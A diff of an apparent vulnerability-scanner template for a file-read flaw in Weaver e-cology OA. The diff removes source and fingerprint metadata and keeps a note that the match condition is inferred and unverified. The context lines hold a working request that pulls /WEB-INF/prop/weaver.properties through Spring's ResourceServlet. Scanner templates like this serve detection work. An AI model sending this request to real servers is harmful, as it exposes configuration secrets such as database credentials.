@@ -3,14 +3,8 @@ info:
   name: 泛微OA E-org.springframework.web.servlet.ResourceServlet文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kp8vk68g8kp0iknv
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kp8vk68g8kp0iknv
-    fofa: app="泛微-OA(e-cology)"
 http:
 - raw:
   - GET /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties HTTP/1.1
